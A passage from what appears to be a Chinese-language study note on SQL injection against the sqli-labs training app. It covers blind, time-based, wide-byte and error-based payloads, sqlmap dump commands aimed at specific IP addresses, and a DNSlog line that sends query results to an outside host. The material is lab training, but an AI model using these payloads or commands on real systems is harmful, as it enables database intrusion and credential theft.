<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and left(database(),1)&gt;&#x27;</span>r<span class="string">&#x27;--+ ?id=1&#x27;</span> <span class="keyword">and</span> <span class="keyword">left</span>(database(),<span class="number">1</span>)<span class="operator">&lt;</span><span class="string">&#x27;t&#x27;</span><span class="comment">--+ ?id=1&#x27; and left(database(),1)=&#x27;s&#x27; --+ ?id=1&#x27; and left(database(),2)=&#x27;se&#x27; --+ ?id=1&#x27; and left(database(),3)=&#x27;sec&#x27; --+ ... ?id=1&#x27; and left(database(),8)=&#x27;security&#x27; --+ </span></span><br><span class="line"><span class="comment">--【security】</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><strong>方法四：使用burp</strong></p>
<p><img src="./%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%5Cburp-sql.jpg" alt="4"></p>
<p>4.判断表个数</p>
<p>count()函数是用来统计表中记录的一个函数，返回匹配条件的行数。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and (select count(table_name) from information_schema.tables where table_schema=database())&gt;0 --+ </span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="built_in">count</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database())<span class="operator">=</span><span class="number">4</span> <span class="comment">--+ </span></span><br><span class="line"><span class="comment">--【4个表】</span></span><br></pre></td></tr></table></figure>


<p>5、判断表的长度</p>
<p>limit可以被用于强制select语句返回指定的条数。</p>
<p>length：获取数据串的长度</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=6 --+ </span></span><br><span class="line"><span class="string">--【第一个表长度为6】 </span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span class="keyword">and</span> length((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">8</span> <span class="comment">--+ </span></span><br><span class="line"><span class="comment">--【第二个表长度为8】</span></span><br></pre></td></tr></table></figure>
<p>6、猜表名</p>
<p>用substr函数：截取字符串，可以指定起始位置和长度</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)&gt;&#x27;</span>d<span class="string">&#x27; --+ </span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span class="keyword">and</span> substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">&gt;</span><span class="string">&#x27;f&#x27;</span> <span class="comment">--+ </span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)=&#x27;</span>e<span class="string">&#x27; --+ </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span class="keyword">and</span> substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">6</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;s&#x27;</span> <span class="comment">--+ </span></span><br><span class="line"></span><br><span class="line"><span class="comment">--【第一个表名为emails】</span></span><br><span class="line"><span class="comment">--可以用burp进行跑，类似上方</span></span><br></pre></td></tr></table></figure>
<p>7、猜解字段名和字段信息</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#确定字段个数 </span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and (select count(column_name) from information_schema.columns where table_schema=database() and table_name = &#x27;</span>users<span class="string">&#x27;)&gt;0 --+ </span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="built_in">count</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>database() <span class="keyword">and</span> table_name <span class="operator">=</span> <span class="string">&#x27;users&#x27;</span>)<span class="operator">=</span><span class="number">3</span> <span class="comment">--+ </span></span><br><span class="line">【字段个数为<span class="number">3</span>】 </span><br><span class="line"></span><br><span class="line">#确定字段名的长度 </span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and length((select column_name from information_schema.columns where table_schema=database() and table_name = &#x27;</span>users<span class="string">&#x27; limit 0,1))&gt;0 --+ </span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span class="keyword">and</span> length((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>database() <span class="keyword">and</span> table_name <span class="operator">=</span> <span class="string">&#x27;users&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">2</span> <span class="comment">--+</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and length((select column_name from information_schema.columns where table_schema=database() and table_name = &#x27;</span>users<span class="string">&#x27; limit 1,1))=8 --+ </span></span><br><span class="line"><span class="string">--【第一个字段长度为2，第二个字段长度为8】 </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#猜字段名 同上使用burp </span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span class="keyword">and</span> substr((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>database() <span class="keyword">and</span> table_name <span class="operator">=</span> <span class="string">&#x27;users&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;i&#x27;</span> <span class="comment">--+ </span></span><br><span class="line"><span class="comment">--【...id,username,password...】 </span></span><br><span class="line"></span><br><span class="line">#确定字段数据长度 </span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and length((select username from users limit 0,1))=4 --+ </span></span><br><span class="line"><span class="string">--【第一个字段数据长度为4】 #猜解字段数据 同上使用burp </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span class="keyword">and</span> substr((<span class="keyword">select</span> username <span class="keyword">from</span> users limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;d&#x27;</span> <span class="comment">--+ ?id=1&#x27; and ascii(substr((select username from users limit 0,1),1,1))&gt;79 --+ </span></span><br><span class="line"><span class="comment">--【第一个username数据为dumb】</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h6 id="sqlmap实现布尔注入"><a href="#sqlmap实现布尔注入" class="headerlink" title="sqlmap实现布尔注入"></a>sqlmap实现布尔注入</h6><p>用到参数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">--batch: 用此参数，不需要用户输入，将会使用sqlmap提示的默认值一直运行下去。</span><br><span class="line">--technique:选择注入技术，B:Boolean-based-blind  （布尔型盲注）</span><br><span class="line">--threads 10 :设置线程为10，运行速度会更快</span><br></pre></td></tr></table></figure>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#查询数据库 #【security】 </span></span><br><span class="line">python sqlmap.py -u http://139.224.112.182:8087/sqli1/Less-5/?id=1 --technique B --dbs --batch --threads 10 </span><br><span class="line">        </span><br><span class="line"><span class="comment">#获取数据库中的表 #【emails、referers、uagents、users】 </span></span><br><span class="line">python sqlmap.py -u http://139.224.112.182:8087/sqli1/Less-5/?id=1 --technique B -D security --tables --batch --threads 10 </span><br><span class="line"></span><br><span class="line"><span class="comment">#获取表中的字段名 #【id、username、password】 </span></span><br><span class="line">python sqlmap.py -u http://139.224.112.182:8087/sqli1/Less-5/?id=1 --technique B -D security -T users --columns --batch --threads 10 </span><br><span class="line">        </span><br><span class="line"><span class="comment">#获取字段信息 #【Dumb|Dumb、dhakkan|dumbo ...】</span></span><br><span class="line">python sqlmap.py -u http://139.224.112.182:8087/sqli1/Less-5/?id=1 --technique B -D security -T users -C username,password --dump --batch --threads 10</span><br></pre></td></tr></table></figure>


<h5 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h5><ul>
<li>页面上没有显示位</li>
<li>没有输出报错语句</li>
<li>正确的sql语句和错误的sql语句页面返回一致</li>
</ul>
<h6 id="手工实现："><a href="#手工实现：" class="headerlink" title="手工实现："></a>手工实现：</h6><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> </span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; </span></span><br><span class="line"><span class="string">?id=1&quot; </span></span><br><span class="line"><span class="string">#不管怎么样都不报错，不管对错一直显示一个固定的页面； </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#判断注入点 </span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span class="keyword">and</span> sleep(<span class="number">3</span>)<span class="comment">--+ </span></span><br><span class="line">#页面响应延迟，判断存在时间延迟型注入 </span><br><span class="line"></span><br><span class="line">#获取数据库名长度 </span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and if(length(database())=8,sleep(3),1)--+ </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#获取数据库名 </span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span class="keyword">and</span> if(substr(database(),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;s&#x27;</span>,sleep(<span class="number">3</span>),<span class="number">1</span>)<span class="comment">--+</span></span><br></pre></td></tr></table></figure>
<p>sqlmap实现</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#查询数据库 #【security】 </span></span><br><span class="line">sqlmap -u http://192.168.200.120/sql/Less-9/?id=1  --technique T --dbs --batch --threads 10 </span><br><span class="line"></span><br><span class="line"><span class="comment">#获取数据库中的表 #【emails、referers、uagents、users】 </span></span><br><span class="line">sqlmap -u http://192.168.200.120/sql/Less-9/?id=1  --technique T -D security --tables --batch --threads 10 </span><br><span class="line">       </span><br><span class="line"><span class="comment">#获取表中的字段名 #【id、username、password】 </span></span><br><span class="line">sqlmap -u http://192.168.200.120/sql/Less-9/?id=1  --technique T -D security -T users --columns --batch --threads 10 </span><br><span class="line">        </span><br><span class="line"><span class="comment">#获取字段信息 【Dumb|Dumb、dhakkan|dumbo ...】 </span></span><br><span class="line">sqlmap -u http://192.168.200.120/sql/Less-9/?id=1  --technique T -D security -T users -C username,password --dump --batch --threads 10</span><br></pre></td></tr></table></figure>


<h4 id="2、DNSlog注入（有待学习）"><a href="#2、DNSlog注入（有待学习）" class="headerlink" title="2、DNSlog注入（有待学习）"></a>2、DNSlog注入（有待学习）</h4><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Xy--1/p/12896599.html">https://www.cnblogs.com/Xy--1/p/12896599.html</a></p>
<h5 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h5><p><strong>什么是DNS</strong></p>
<p>DNS的全称是 <code>Domain Name System</code>（域名系统），它将域名解析为 IP，使人更方便地访问互联网。当用户输入某一网址如<code>www.baidu.com</code>，网络上的 DNS 服务器会将该域名解析，并找到对应的真实IP：<code>182.61.200.6</code>，使用户可以访问这台服务器上相应的服务。</p>
<p><strong>什么是DNSlog</strong></p>
<p>DNSlog 就是存储在 DNS 服务器上的域名信息，它记录着用户对域名的访问信息，类似日志文件。SQL 盲注、命令执行、SSRF 及 XSS 等攻击而无法看到回显结果时，就会用到 DNSlog 技术。</p>
<p><strong>为什么用Dnslog盲注</strong></p>
<p>对于SQL盲注，我们可以通过布尔或者时间盲注获取内容，但是整个过程效率低，需要发送很多的请求进行判断，容易触发安全设备的防护，最后导致 IP 被 ban，Dnslog 盲注可以减少发送的请求，直接回显数据实现注入。</p>
<h5 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h5><p>攻击语句：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> load_file(concat(<span class="string">&#x27;\\\\&#x27;</span>,攻击语句,<span class="string">&#x27;.XXX.ceye.io\\abc&#x27;</span>))</span><br></pre></td></tr></table></figure>
<h4 id="3、宽字节注入"><a href="#3、宽字节注入" class="headerlink" title="3、宽字节注入"></a>3、宽字节注入</h4><p><strong>原理</strong>：宽字节注入是利用mysql的一个特性，<code>mysql在使用GBK编码的时候，会认为两个字符是一个汉字</code>【前一个ascii码要大于<code>128</code>，才到汉字的范围】</p>
<p>简单的URL编码</p>
<table>
<thead>
<tr>
<th>空格</th>
<th>%20</th>
</tr>
</thead>
<tbody><tr>
<td>‘（单引号）</td>
<td>%27</td>
</tr>
<tr>
<td>#</td>
<td>%23</td>
</tr>
<tr>
<td>\（反斜杠）</td>
<td>%5C</td>
</tr>
<tr>
<td></td>
<td>%df</td>
</tr>
</tbody></table>
<p>当输入单引号，假设这里我们使用<code>addslashes</code>转义，对应的url编码是：<br><strong><code>&#39;</code> –&gt;<code>\&#39;</code>–&gt; <code>%5c%27</code></strong><br>当在前面引入一个ASCII大于128的字符【比如%df、%aa】，url编码变为：<br><strong><code>%df&#39;</code> –&gt; <code>%df\&#39;</code> –&gt; <code>(%df%5C)%27</code>–&gt;<code>(数据库GBK)</code>–&gt;<code>運&#39;</code></strong></p>
<p>前端输入**<code>%df&#39;</code><strong>时首先经过上面</strong><code>addslashes</code><strong>函数和浏览器</strong><code>url编码</code><strong>转义变成了</strong><code>%df%5c%27</code>**  ，单引号 ‘ = %27成功逃脱，利用这个特性从而可实施SQL注入的利用。</p>
<h5 id="手工测试："><a href="#手工测试：" class="headerlink" title="手工测试："></a>手工测试：</h5><p>测试环境：sql-less-33</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、测试</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Welcome    Dhakkan</span></span><br><span class="line"><span class="string">Your Login name:Dumb</span></span><br><span class="line"><span class="string">Your Password:Dumb</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>Hint: The Query String you input <span class="keyword">is</span> escaped <span class="keyword">as</span> : <span class="number">1</span> \<span class="string">&#x27;</span></span><br><span class="line"><span class="string">The Query String you input in Hex becomes : 31205c27</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment">--当输入 &#x27; 被编成了\ 所以推测应该是函数转义：addslashes函数</span></span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="operator">%</span>df<span class="string">&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">或者【只要ASCII大于<span class="number">128</span>的字符就可以】</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="operator">%</span>aa<span class="string">&#x27;</span></span><br><span class="line"><span class="string">此时会报错</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="number">2</span>、确定字段</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="operator">%</span>df<span class="string">&#x27; order by 4 --+          </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">输入<span class="number">3</span> 正常，but4不正常了，所以判断字段数为<span class="number">3</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">3、确定显示位</span></span><br><span class="line"><span class="string">?id=-1%aa&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="comment">--+</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Welcome    Dhakkan</span></span><br><span class="line"><span class="string">Your Login name:2</span></span><br><span class="line"><span class="string">Your Password:3</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment">--确定了回显位置是 2  3</span></span><br><span class="line"></span><br><span class="line"><span class="number">4</span>、查询信息</span><br><span class="line">#查询数据库</span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="operator">%</span>aa<span class="string">&#x27; union select 1,2,database() --+</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">Welcome    Dhakkan</span><br><span class="line">Your Login name:<span class="number">2</span></span><br><span class="line">Your Password:security</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">--得到数据库是security</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#查询表名</span></span><br><span class="line"><span class="string">?id=-1%aa&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database()  <span class="comment">--+</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Welcome    Dhakkan</span></span><br><span class="line"><span class="string">Your Login name:2</span></span><br><span class="line"><span class="string">Your Password:emails,referers,uagents,users</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">#查询字段名</span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="operator">%</span>aa<span class="string">&#x27; union select 1, 2,group_concat(column_name) from information_schema.columns where table_name=0x7573657273  --+</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">Welcome    Dhakkan</span><br><span class="line">Your Login name:<span class="number">2</span></span><br><span class="line">Your Password:user_id,first_name,last_name,<span class="keyword">user</span>,password,avatar,last_login,failed_login,id,username,password,level,id,username,password,level,id,username,password</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">--这里表名table_name的值必须转换成16进制，如果不用16进制就得用引号包裹，当有addlashes函数就会转义引号，就会导致查询失败，使用16进制避免了这个问题。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#查询字段信息</span></span><br><span class="line"><span class="string">---待更新</span></span><br><span class="line"><span class="string">?id=-1%aa&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(username),group_concat(password) <span class="keyword">from</span> users  <span class="comment">--+</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Welcome    Dhakkan</span></span><br><span class="line"><span class="string">Your Login name:Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4</span></span><br><span class="line"><span class="string">Your Password:Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4 </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p><strong>待更新</strong></p>
<h5 id="使用sqlmap："><a href="#使用sqlmap：" class="headerlink" title="使用sqlmap："></a>使用sqlmap：</h5><h4 id="4、报错注入（需要补充）"><a href="#4、报错注入（需要补充）" class="headerlink" title="4、报错注入（需要补充）"></a>4、报错注入（需要补充）</h4><h5 id="floor报错注入-双查询注入"><a href="#floor报错注入-双查询注入" class="headerlink" title="floor报错注入/双查询注入"></a>floor报错注入/双查询注入</h5><p>双查询报错/floor报错注入是由于<code>rand()</code>，<code>count()</code>，<code>group by</code> ，<code>floor</code>四个语句联合使用造成的，缺一不可。</p>
<p>一些研究人员发现，使用<code>group by</code>子句结合<code>rand()</code>函数以及像<code>count（*）</code>这样的聚合函数，在SQL查询时会出现错误，这种错误是随机产生的，这就产生了双重查询/floor报错注入。使用<code>floor()</code>函数只是为了将查询结果分类</p>
<p>需用到四个函数和一个<code>group by</code>语句：</p>
<ol>
<li><code>group by ...</code> —&gt;分组语句 //将查询的结果分类汇总</li>
<li><code>rand()</code> —&gt;在0-1之间随机数生成函数</li>
<li><code>floor()</code> —&gt;取整函数 //用来对生成的随机数取整</li>
<li><code>concat()</code>、 <code>concat_ws()</code>—&gt;连接字符串</li>
<li><code>count()</code> —&gt;统计函数 //结合group by语句统计分组后的数据</li>
</ol>
<p>子查询：内部查询、简单理解，select中嵌套一个select查询</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> concat(&quot;-&quot;,(<span class="keyword">select</span> database()));</span><br></pre></td></tr></table></figure>
<p><strong>floor报错注入：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,count(*), concat((select database()), floor(rand(1)*2))as a from information_schema.tables group by a --+</span></span><br></pre></td></tr></table></figure>
<p>因为rand的随机性：所以我们每次不一定都可以看到正常页面，当我们加上1之后，就i可以了</p>
<p><strong>双查询注入</strong></p>
<p>当group by 在查询虚拟表和插入虚拟表时，如果这两次a语句执行的结果不一致就会引发错误，错误提示信息是插入的主键重复，通过自定义提示里报错信息中的主键值来获得敏感信息。</p>
<p><strong>payloads</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#获取数据库名 </span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,count(*),concat_ws(&#x27;</span><span class="operator">-</span><span class="string">&#x27;,(select database()),floor(rand(0)*2))as a from information_schema.tables group by a--+ </span></span><br><span class="line"><span class="string">或者 </span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat(<span class="string">&#x27;~&#x27;</span>,database(),<span class="string">&#x27;~&#x27;</span>,<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>))<span class="keyword">as</span> x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a) <span class="comment">--+ </span></span><br><span class="line"></span><br><span class="line">#获取表名 </span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,count(*),concat_ws(&#x27;</span><span class="operator">-</span><span class="string">&#x27;,(select group_concat(table_name) from information_schema.tables where table_schema=database()),floor(rand()*2))as a from information_schema.tables group by a--+ </span></span><br><span class="line"><span class="string">或者 </span></span><br><span class="line"><span class="string">?id=1&#x27;</span><span class="keyword">and</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat(<span class="string">&#x27;~&#x27;</span>,(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema <span class="operator">=</span> database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="string">&#x27;~&#x27;</span>,<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>))<span class="keyword">as</span> x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a) <span class="comment">--+</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h5 id="updatexml报错注入"><a href="#updatexml报错注入" class="headerlink" title="updatexml报错注入"></a>updatexml报错注入</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">updatexml(xml_target, XPath_string, new_value)：返回替换的XML片段</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th align="left">参数</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">XML_document</td>
<td align="left">String格式，需要操作的xml片段</td>
</tr>
<tr>
<td align="left">XPath_string</td>
<td align="left">需要更新的xml路径(Xpath格式)</td>
</tr>
<tr>
<td align="left">new_value</td>
<td align="left">String格式，更新后的内容</td>
</tr>
</tbody></table>
<p>payload</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">爆数据库版本信息</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">SELECT</span> @<span class="variable">@version</span>),<span class="number">0x7e</span>),<span 